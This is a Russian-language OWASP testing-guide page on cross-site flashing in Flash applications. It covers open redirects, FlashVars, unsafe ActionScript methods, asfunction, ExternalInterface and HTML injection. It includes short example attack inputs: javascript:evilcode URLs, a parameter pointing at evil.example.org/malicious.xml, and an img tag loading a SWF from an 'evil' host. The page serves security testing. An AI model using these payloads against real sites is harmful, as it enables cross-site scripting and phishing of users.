---

layout: col-document
title: WSTG - Latest
tags: WSTG

---

{% include breadcrumb.html %}
# Тестирование межсайтовых Flash

|ID          |
|------------|
|WSTG-CLNT-08|

## Обзор

[ActionScript](https://ru.wikipedia.org/wiki/ActionScript), основанный на [ECMAScript](https://ru.wikipedia.org/wiki/ECMAScript), — это язык, используемый Flash-приложениями для решения интерактивных задач. Существует три версии языка ActionScript. ActionScript 1.0 и ActionScript 2.0 очень похожи, поскольку ActionScript 2.0 является расширением ActionScript 1.0. ActionScript 3.0, представленный в Flash Player 9, представляет собой переписанный язык для поддержки объектно-ориентированного проектирования.

ActionScript, как и любой другой язык, имеет некоторые шаблоны реализации, которые могут привести к проблемам с безопасностью. В частности, поскольку Flash-приложения часто встроены в браузеры, в некорректных Flash-приложениях могут присутствовать такие уязвимости, как межсайтовые скрипты на основе DOM (DOM XSS).

 Межсайтовый Flash (англ.: Cross-Site Flashing, XSF) — это уязвимость, имеющая такое же воздействие, как и XSS.

XSF возникает, когда следующие сценарии вызываются из разных доменов:

- Один ролик загружает другой с помощью функций `loadMovie*` (или других) и имеет доступ к той же песочнице или её части.
- HTML-страница использует JavaScript для управления роликом Adobe Flash, например, вызывая:
    - `GetVariable` для доступа к публичным и статичным объектам Flash из JavaScript в виде строки.
    - `SetVariable`, чтобы присвоить статичному или публичному Flash-объекту новое строковое значение с помощью JavaScript.
- Непредусмотренный обмен данными между браузером и SWF-приложением, который может привести к краже данных из SWF-приложения.

XSF может быть проведён посредством принудительной загрузки вредоносного SWF из внешнего Flash-файла. Эта атака может привести к XSS или модификации графического интерфейса, чтобы обмануть пользователя, вынудив ввести учётные данные в поддельную форму Flash. XSF можно использовать при наличии Flash HTML инъекции или внешних файлов SWF, когда используются методы `loadMovie*`.

### Открытые редиректоры

SWF-файлы имеют возможность навигации в браузере. Если SWF присвоен в FlashVar, то SWF может использоваться как открытый редиректор. Открытый редиректор — это функция на доверенном сайте, которую злоумышленник может использовать для перенаправления конечного пользователя на вредоносный сайт. Они часто применяются в фишинговых атаках. Подобно межсайтовому скриптингу атака предполагает, что пользователь переходит по вредоносной ссылке.

В случае Flash вредоносный URL-адрес может выглядеть следующим образом:

```text
http://trusted.example.org/trusted.swf?getURLValue=http://www.evil-spoofing-website.org/phishEndUsers.html
```

В приведённом выше примере конечный пользователь может увидеть, что URL начинается с его любимого доверенного сайта, и перейти по нему. Ссылка загрузит доверенный SWF-файл, который принимает `getURLValue` и предоставляет его для вызова ActionScript-навигации в браузере:

```actionscript
getURL(_root.getURLValue,"_self");
```

Это приведёт к переходу браузера на вредоносный URL, предоставленный злоумышленником. На этом этапе фишер успешно использовал доверие пользователя к `trust.example.org`, чтобы заставить пользователя посетить его вредоносный сайт. Оттуда он может запустить 0-day, провести подмену оригинального сайта или любой другой тип атаки. SWF-файлы могут непреднамеренно служить в качестве открытых редиректоров на сайте.

Разработчикам следует избегать использования абсолютных URL во FlashVar. Если они планируют перемещаться только по своему сайту, то следует использовать относительные URL или убедиться, что URL начинается с доверенного домена и протокола.

### Атаки и версии Flash Player

С мая 2007 года Adobe выпустила три новые версии Flash Player. Каждая новая версия ограничивает некоторые из ранее описанных атак.

| Версия Player | `asfunction` | ExternalInterface | GetURL | HTML инъекция |
|----------------|--------------|-------------------|--------|----------------|
| v9.0 r47/48    |  Да         |   Да             | Да    |     Да        |
| v9.0 r115      |  Нет          |   Да             | Да    |     Да        |
| v9.0 r124      |  Нет          |   Да             | Да    |     Частично  |

## Задачи тестирования

- Декомпилировать и проанализировать код приложения.
- Оцените входные данные приёмников и небезопасное использование методов.

## Как тестировать

С момента первой публикации [Тестирование приложений на Flash](http://www.wisec.it/en/Docs/flash_App_testing_Owasp07.pdf) были выпущены новые версии Flash Player, чтобы предотвратить некоторые атаки, которые будут описаны далее. Тем не менее, часть проблем остаются нерешёнными, поскольку они являются результатом небезопасных методов разработки.

### Декомпиляция

Поскольку SWF-файлы интерпретируются виртуальной машиной ([AVM](https://en.wikipedia.org/wiki/Tamarin_(software))), встроенной в сам Player, они потенциально могут быть декомпилированы и проанализированы. Наиболее известным и бесплатным декомпилятором ActionScript 2.0 является Flare.

Чтобы декомпилировать SWF-файл с помощью Flare, просто введите:

`$ flare hello.swf`

В результате будет создан новый файл с именем hello.flr.

Декомпиляция помогает тестировщикам, поскольку позволяет проводить тестирование Flash-приложений методом «белого ящика». Быстрый поиск в Интернете может привести вас к различным дизассемблерам и средствам защиты Flash.

### Неопределенные переменные FlashVars

FlashVars — это переменные, которые разработчик SWF планирует получить с web-страницы. Они обычно присваиваются в HTML-теге Object или Embed. Например:

```html
<object width="550" height="400" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,124,0">
    <param name="movie" value="somefilename.swf">
    <param name="FlashVars" value="var1=val1&var2=val2">
    <embed src="somefilename.swf" width="550" height="400" FlashVars="var1=val1&var2=val2">
</embed>
</object>
```

FlashVars также можно инициализировать с помощью URL:

`http://www.example.org/somefilename.swf?var1=val1&var2=val2`

В ActionScript 3.0 разработчик должен явно присвоить значения FlashVar локальным переменным. Как правило, это выглядит следующим образом:

```actionscript
var paramObj:Object = LoaderInfo(this.root.loaderInfo).parameters;
var var1:String = String(paramObj["var1"]);
var var2:String = String(paramObj["var2"]);
```

В ActionScript 2.0 любая неинициализированная глобальная переменная считается FlashVar. Глобальные переменные — это те, которым предшествуют `_root`, `_global` или `_level0`. Это означает, что если такой атрибут, как `_root.varname`, не определён в коде, он может быть перезаписан в параметрах URL:

`http://victim/file.swf?varname=value`

Независимо от того, смотрите ли вы на ActionScript 2.0 или ActionScript 3.0, FlashVars может быть вектором атаки. Давайте посмотрим на код ActionScript 2.0, который является уязвимым:

Пример:

```actionscript
movieClip 328 __Packages.Locale {

#initclip
    if (!_global.Locale) {
    var v1 = function (on_load) {
        var v5 = new XML();
        var v6 = this;
        v5.onLoad = function (success) {
        if (success) {
            trace('Locale loaded xml');
            var v3 = this.xliff.file.body.$trans_unit;
            var v2 = 0;
            while (v2 < v3.length) {
            Locale.strings[v3[v2]._resname] = v3[v2].source.__text;
            ++v2;
            }
            on_load();
        } else {}
        };
        if (_root.language != undefined) {
        Locale.DEFAULT_LANG = _root.language;
        }
        v5.load(Locale.DEFAULT_LANG + '/player_' +
                            Locale.DEFAULT_LANG + '.xml');
    };
```

Приведённый выше код может быть атакован запросом:

`http://victim/file.swf?language=http://evil.example.org/malicious.xml?`

### Небезопасные методы

Когда точка входа идентифицирована, данные, которые она представляет, могут быть использованы небезопасными методами. Если данные не будут отфильтрованы или валидированы, это может привести к некоторым уязвимостям.

Небезопасными, начиная с версии r47, являются следующие методы:

- `loadVariables()`
- `loadMovie()`
- `getURL()`
- `loadMovie()`
- `loadMovieNum()`
- `FScrollPane.loadScrollContent()`
- `LoadVars.load`
- `LoadVars.send`
- `XML.load( 'url' )`
- `LoadVars.load( 'url' )`
- `Sound.loadSound( 'url' , isStreaming );`
- `NetStream.play( 'url' );`
- `flash.external.ExternalInterface.call(_root.callback)`
- `htmlText`

### Эксплуатация отражённых XSS

Файл swf должен быть размещён на хосте жертвы, и должны использоваться методы отражённого XSS. Злоумышленник заставляет браузер загрузить чистый swf-файл прямо в адресной строке (с помощью перенаправления или социальной инженерии) или загрузив его через iframe со злонамеренной страницы:

```html
<iframe src='http://victim/path/to/file.swf'></iframe>
```

В этой ситуации браузер самостоятельно сгенерирует HTML-страницу, как если бы она была размещена на хосте жертвы.

### GetURL (AS2) / NavigateToURL (AS3)

Функция GetURL в ActionScript 2.0 и NavigateToURL в ActionScript 3.0 позволяют флэш-ролику загружать URI в окно браузера. Если в качестве первого аргумента для getURL используется неопределённая переменная:

`getURL(_root.URI,'_targetFrame');`

Или если FlashVar используется в качестве параметра, который передаётся функции navigateToURL:

```actionscript
var request:URLRequest = new URLRequest(FlashVarSuppliedURL);
navigateToURL(request);
```

Тогда это будет означать, что можно вызвать JavaScript в том же домене, где размещён ролик, запросив:

`http://victim/file.swf?URI=javascript:evilcode`

`getURL('javascript:evilcode','_self');`

То же самое возможно, когда только часть `getURL` контролируется с помощью инъекции DOM в JavaScript-инъекцию Flash:

```js
getUrl('javascript:function('+_root.arg+')')
```

### Использование `asfunction`

Чтобы заставить ссылку выполнять функцию ActionScript в SWF-файле вместо открытия URL можно использовать специальный протокол `asfunction`. До выпуска Flash Player 9 r48 `asfunction` можно было использовать в каждом методе с URL в качестве аргумента. После этого `asfunction` была ограничена использованием в HTML TextField.

Это означает, что тестировщик может попытаться ввести:

```actionscript
asfunction:getURL,javascript:evilcode
```

в каждом небезопасном методе, например:

```actionscript
loadMovie(_root.URL)
```

запрашивая

`http://victim/file.swf?URL=asfunction:getURL,javascript:evilcode`

### ExternalInterface

`ExternalInterface.call` — это статический метод, представленный Adobe для улучшения взаимодействия Flash Player c браузером как в ActionScript 2.0, так и в ActionScript 3.0.

С точки зрения безопасности им можно злоупотреблять, когда можно контролировать часть его аргументов:

```actionscript
flash.external.ExternalInterface.call(_root.callback);
```

схема атаки для такого рода уязвимостей может быть примерно следующей:

```js
eval(evilcode)
```

поскольку внутренний JavaScript, выполняемый браузером, будет чем-то вроде:

```js
eval('try { __flash__toXML('+__root.callback+') ; } catch (e) { "<undefined/>"; }')
```

### HTML-инъекции

Объекты TextField могут отображать минимальный HTML, присвоив:

```actionscript
tf.html = true
tf.htmlText = '<tag>text</tag>'
```

Таким образом, если какая-то часть текста может контролироваться тестировщиком, может быть введен тег `<a>` или тег изображения, что приведёт к изменению графического интерфейса пользователя или XSS-атаке в браузере.

Некоторые примеры атак с тегом `<a>`:

- Классический XSS: `<a href='javascript:alert(123)'>`
- Вызов функции: `<a href='asfunction:function,arg'>`
- Вызов публичных функций SWF: `<a href='asfunction:_root.obj.function, arg'>`
- Вызов нативной статичной asfunction: `<a href='asfunction:System.Security.allowDomain,evilhost'>`

Также можно было бы использовать тег изображения:

```html
<img src='http://evil/evil.swf'>
```

В этом примере `.swf` необходим для обхода внутреннего фильтра Flash Player:

```html
<img src='javascript:evilcode//.swf'>
```

После выпуска Flash Player 9.0.124.0 XSS больше не эксплуатируется, но модификацию графического интерфейса провести всё ещё можно.

При работе с SWF могут быть полезны следующие инструменты:

- [OWASP SWFIntruder](https://wiki.owasp.org/index.php/Category:SWFIntruder)
- [Декомпилятор – Flare](http://www.nowrap.de/flare.html)
- [Дизассемблер – Flasm](http://flasm.sourceforge.net/)
- [Swfmill – преобразование SWF в XML и наоборот](https://www.swfmill.org/)
